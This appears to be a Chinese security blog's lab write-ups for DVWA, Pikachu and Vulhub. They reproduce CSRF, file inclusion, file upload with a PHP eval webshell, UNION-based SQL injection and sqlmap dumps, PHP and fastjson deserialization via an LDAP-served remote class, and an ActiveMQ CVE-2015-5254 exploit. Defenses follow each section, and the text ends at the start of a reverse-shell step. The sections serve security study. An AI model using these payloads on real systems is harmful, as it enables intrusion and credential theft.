      <p>修改密码的题，只要登录之后，输入修改后的密码两次就能改掉密码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070957619.png" alt="image-20240607095729552"></p>
<p>密码修改后能看到网址已经改变为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DVWA-master/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406070958218.png" alt="image-20240607095828143"></p>
<p>因此只要让受害者访问这个网址就可以把受害者的密码成功修改</p>
<p>（但其实用户一看这个网址就会觉得奇怪，所以可以将这个网址变成一个短网址掩饰一下）</p>

        <h4 id="防御-3"   >
          <a href="#防御-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-3" class="headerlink" title="防御"></a>防御</h4>
      <p>在表单中加入CSRF Token（但也可以通过使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中，就可以完成修改密码的操作，可以去构造一个攻击脚本，脚本的作用就是获取用户token然后修改密码，将其放置在存储型XSS中，只要用户点击存储型XSS页面，就会完成CSRF攻击，即修改密码）</p>
<p>检查请求的来源</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$referer = $_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">if (strpos($referer, &#x27;https://yourdomain.com&#x27;) !== 0)</span><br></pre></td></tr></table></div></figure>




        <h2 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
      
        <h4 id="原理-4"   >
          <a href="#原理-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4>
      <p>应用程序通过用户输入的文件路径来动态包含和执行文件，攻击者通过操控这些输入，能够访问或执行服务器上未授权的文件，甚至执行恶意代码</p>

        <h4 id="靶场复现-2"   >
          <a href="#靶场复现-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-2" class="headerlink" title="靶场复现"></a>靶场复现</h4>
      
        <h5 id="本地"   >
          <a href="#本地" class="heading-link"><i class="fas fa-link"></i></a><a href="#本地" class="headerlink" title="本地"></a>本地</h5>
      <p>随便选择一个提交，可以在url上看到这是一个文件file2.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071005701.png" alt="image-20240607100511598"></p>
<p>在Unsafe Fileupload处随便选一道题上传带有phpinfo()的图片文件info.jpg（这里是用的getimagesize题里的）</p>
<p>上传后复制路径回到题目，将路径复制到题目中</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2024/06/07/23294766626ba793a22727627205.jpg&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071010432.png" alt="image-20240607101057352"></p>

        <h5 id="远程"   >
          <a href="#远程" class="heading-link"><i class="fas fa-link"></i></a><a href="#远程" class="headerlink" title="远程"></a>远程</h5>
      <p>随便选择一个提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071039869.png" alt="image-20240607103937843"></p>
<p>把参数<code>filename</code>值改为<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.bilibili.com/" >https://www.bilibili.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071041025.png" alt="image-20240607104151936"></p>

        <h4 id="防御-4"   >
          <a href="#防御-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-4" class="headerlink" title="防御"></a>防御</h4>
      <p>输入验证和过滤</p>
<p>设置白名单</p>
<p>禁用远程文件包含</p>

        <h2 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>
      
        <h4 id="原理-5"   >
          <a href="#原理-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4>
      <p>通过上传包含恶意代码的文件，利用服务器对上传文件处理的不当，执行恶意代码或访问未授权的文件</p>

        <h4 id="靶场复现-3"   >
          <a href="#靶场复现-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-3" class="headerlink" title="靶场复现"></a>靶场复现</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071047236.png" alt="image-20240607104742196"></p>
<p>上传写有一句话木马的jpg文件，同时抓包发送到Repeater，将文件后缀修改为php</p>
<p><code>GIF89a &lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071052260.png" alt="image-20240607105252170"></p>
<p>发送后得到上传路径 uploads/test.php，按这个路径到蚁剑进行连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071057848.png" alt="image-20240607105759778"></p>
<p>添加数据，拿到shell</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071102172.png" alt="image-20240607110217115"></p>

        <h4 id="防御-5"   >
          <a href="#防御-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4>
      <p>生成唯一目标文件名，以避免文件名冲突或敏感信息泄露</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$target_file = md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br></pre></td></tr></table></div></figure>

<p>限制上传文件类型和大小</p>
<p>验证文件内容，使用 <code>getimagesize</code> 函数检查图像文件的真实性</p>

        <h2 id="SQL注入"   >
          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2>
      
        <h4 id="原理-6"   >
          <a href="#原理-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4>
      <p>通过向应用程序发送恶意构造的SQL语句，操控数据库执行未授权的操作，常发生在应用程序未对用户输入进行充分验证和过滤的情况下</p>

        <h4 id="分类-1"   >
          <a href="#分类-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#分类-1" class="headerlink" title="分类"></a>分类</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071105378.png" alt="image-20240607110545309"></p>

        <h4 id="注入过程"   >
          <a href="#注入过程" class="heading-link"><i class="fas fa-link"></i></a><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4>
      <p><code>SELECT \* FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></p>

        <h5 id="手工注入"   >
          <a href="#手工注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5>
      
        <h6 id="判断类型（数字型or字符型）"   >
          <a href="#判断类型（数字型or字符型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断类型（数字型or字符型）" class="headerlink" title="判断类型（数字型or字符型）"></a>判断类型（数字型or字符型）</h6>
      
        <h6 id="查看列数（以字符型为例）"   >
          <a href="#查看列数（以字符型为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数（以字符型为例）" class="headerlink" title="查看列数（以字符型为例）"></a>查看列数（以字符型为例）</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2;#</span><br><span class="line">&#x27; union select 1,2,3;#</span><br><span class="line">......</span><br><span class="line">依次递增测试直到报错</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取数据库名（以2列为例）"   >
          <a href="#获取数据库名（以2列为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名（以2列为例）" class="headerlink" title="获取数据库名（以2列为例）"></a>获取数据库名（以2列为例）</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select 1,group_concat(schema_name) from information_schema.schemata;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取表名"   >
          <a href="#获取表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;数据库名&#x27;;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取表字段名"   >
          <a href="#获取表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;;#</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取字段内容"   >
          <a href="#获取字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(user,password) from 数据库名.表名;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="Sqlmap（以DVWA靶场为例）"   >
          <a href="#Sqlmap（以DVWA靶场为例）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap（以DVWA靶场为例）" class="headerlink" title="Sqlmap（以DVWA靶场为例）"></a>Sqlmap（以DVWA靶场为例）</h5>
      <p>在Sqlmap文件夹打开终端</p>

        <h6 id="获取数据库名"   >
          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取表名-1"   >
          <a href="#获取表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取表字段名-1"   >
          <a href="#获取表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-1" class="headerlink" title="获取表字段名"></a>获取表字段名</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>


        <h6 id="获取字段内容-1"   >
          <a href="#获取字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-1" class="headerlink" title="获取字段内容"></a>获取字段内容</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></div></figure>


        <h4 id="防御-6"   >
          <a href="#防御-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4>
      <p>使用预处理语句和参数化查询来避免SQL注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $conn-&gt;prepare(&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;);</span><br><span class="line">$stmt-&gt;bind_param(&quot;ss&quot;, $user, $pass); // &#x27;ss&#x27; 表示两个参数都是字符串类型</span><br><span class="line"></span><br><span class="line">// 执行预处理语句</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$result = $stmt-&gt;get_result();</span><br></pre></td></tr></table></div></figure>




        <h2 id="反序列化"   >
          <a href="#反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2>
      
        <h3 id="PHP反序列化"   >
          <a href="#PHP反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3>
      
        <h4 id="原理-7"   >
          <a href="#原理-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4>
      <p>攻击者向应用程序提供恶意序列化数据，利用应用程序在反序列化过程中未正确验证或过滤数据的漏洞，从而导致安全问题</p>

        <h4 id="靶场复现-4"   >
          <a href="#靶场复现-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-4" class="headerlink" title="靶场复现"></a>靶场复现</h4>
      <p>靶场源代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br><span class="line">$html=&#x27;&#x27;;</span><br><span class="line">if(isset($_POST[&#x27;o&#x27;]))&#123;</span><br><span class="line">    $s = $_POST[&#x27;o&#x27;];</span><br><span class="line">    if(!@$unser = unserialize($s))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里定义了一个名为 <code>S</code> 的类，包含一个公开变量 <code>$test</code>，初始值为 <code>pikachu</code>    ,构造函数 <code>__construct()</code> 在对象被创建时自动调用，用来输出 <code>$test</code> 变量的值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071124947.png" alt="image-20240607112450870"></p>
<p>构造一个序列化数据</p>
<p>根据源代码，我们构造时要注意类名为<code>S</code>，变量名为<code>test</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class S &#123;</span><br><span class="line">    public $test = &quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$test = new S();</span><br><span class="line">// 序列化</span><br><span class="line">$serialized = serialize($test);</span><br><span class="line">echo $serialized;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>

<p>运行得到输出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></div></figure>

<p>填写到框内提交</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071333387.png" alt="image-20240607133314314"></p>

        <h4 id="防御-7"   >
          <a href="#防御-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4>
      <p>对反序列化前的输入数据进行严格的验证和过滤，确保数据格式和内容的合法性</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/O:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;/&#x27;, $data))</span><br></pre></td></tr></table></div></figure>


        <h3 id="fastjson反序列化"   >
          <a href="#fastjson反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h3>
      
        <h4 id="原理-8"   >
          <a href="#原理-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4>
      <p>AutoType机制允许在JSON字符串中指定反序列化的具体类，从而动态地将JSON反序列化为不同类型的Java对象。可以通过构造恶意JSON字符串，指定反序列化为任意类，从而执行该类中的代码。</p>

        <h4 id="靶场复现-5"   >
          <a href="#靶场复现-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#靶场复现-5" class="headerlink" title="靶场复现"></a>靶场复现</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071434020.png" alt="image-20240607143406933"></p>

        <h6 id="编译并上传命令执行代码"   >
          <a href="#编译并上传命令执行代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#编译并上传命令执行代码" class="headerlink" title="编译并上传命令执行代码"></a>编译并上传命令执行代码</h6>
      <p>新建一个Touch.java文件，写入</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Touch</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/Touch&quot;</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后在该文件目录下打开终端，编译，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Touch.java</span><br></pre></td></tr></table></div></figure>

<p>此时该目录下会生成一个Touch.class文件</p>

        <h6 id="启动http服务"   >
          <a href="#启动http服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#启动http服务" class="headerlink" title="启动http服务"></a>启动http服务</h6>
      <p>打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444   //端口号只要不被其他应用占用就行</span><br></pre></td></tr></table></div></figure>


        <h6 id="使用Marshalsec来启动LDAP服务器"   >
          <a href="#使用Marshalsec来启动LDAP服务器" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用Marshalsec来启动LDAP服务器" class="headerlink" title="使用Marshalsec来启动LDAP服务器"></a>使用Marshalsec来启动LDAP服务器</h6>
      <p>在E:\Github\marshalsec-master\target目录下打开终端，运行</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://主机ip地址:4444/#Touch&quot;</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435339.png" alt="image-20240531154409456"></p>

        <h6 id="发包"   >
          <a href="#发包" class="heading-link"><i class="fas fa-link"></i></a><a href="#发包" class="headerlink" title="发包"></a>发包</h6>
      <p>抓包后修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /fastjson HTTP/1.1</span><br><span class="line">Host: 本机ip:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: http://本机ip:8080/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 189</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;axin&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">      &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">   &#125;,</span><br><span class="line">   &quot;is&quot;:&#123;</span><br><span class="line">      &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">      &quot;dataSourceName&quot;:&quot;ldap://本机ip:1389/Touch&quot;,</span><br><span class="line">      &quot;autoCommit&quot;:true</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>发送后会显示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435384.png" alt="image-20240531155441657"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435363.png" alt="image-20240531155505690"></p>
<p>查看docker文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406071435367.png" alt="image-20240531155609569"></p>

        <h4 id="防御-8"   >
          <a href="#防御-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4>
      <p>禁用AutoType，防止通过JSON字符串指定反序列化的具体类</p>
<p>严格控制允许反序列化的类，使用白名单机制，仅允许反序列化指定的安全类</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2024/05/30/Vulhub/">Vulhub-学习</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-05-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-09</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="activemq"   >
          <a href="#activemq" class="heading-link"><i class="fas fa-link"></i></a><a href="#activemq" class="headerlink" title="activemq"></a>activemq</h1>
      
        <h2 id="CVE-2015-5254"   >
          <a href="#CVE-2015-5254" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2015-5254" class="headerlink" title="CVE-2015-5254"></a>CVE-2015-5254</h2>
      <p>Apache <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ActiveMQ&spm=1001.2101.3001.7020" >ActiveMQ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 5.x 5.13.0 之前的安全漏洞，程序造成的漏洞不限制代理中可以序列化的类。远程攻击者可以使一个特殊的序列化 Java 消息服务 (JMS) ObjectMessage 对象利用此漏洞执行任意代码。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525117.png" alt="image-20240624152537048"></p>
<p>点击“Manage ActiveMQ broker”，输入admin/admin登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241525928.png" alt="image-20240624152522850"></p>
<p>下载jmet工具</p>
<p>jmet是一个java写的工具，原理是使用ysoserial生成Payload并发送</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br></pre></td></tr></table></div></figure>

<p>执行（使用 Java 8 或 Java 9，这些版本仍然支持 <code>sun.reflect.Reflection</code> 类）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241611117.png" alt="image-20240624161156059"></p>
<p>(这里因为kali上无法安装jdk-8所以切换成了ubuntu)</p>
<p>网页输入/queuesjsp，查看队列进程</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612138.png" alt="image-20240624161211067"></p>
<p>点击”event”，看到这里的ID与执行后的ID一致</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241612256.png" alt="image-20240624161255198"></p>
<p>点击查看这条消息即可触发命令执行</p>
<p>连接docker的shell</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker <span class="built_in">exec</span> -i </span><br><span class="line">sudo docker <span class="built_in">exec</span> -i 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>

<p>成功创建success文件，说明实现命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406241614612.png" alt="image-20240624161451574"></p>
<p>将命令替换成弹shell语句再利用</p>
<p>先开启监听，监听端口号设为19999</p>
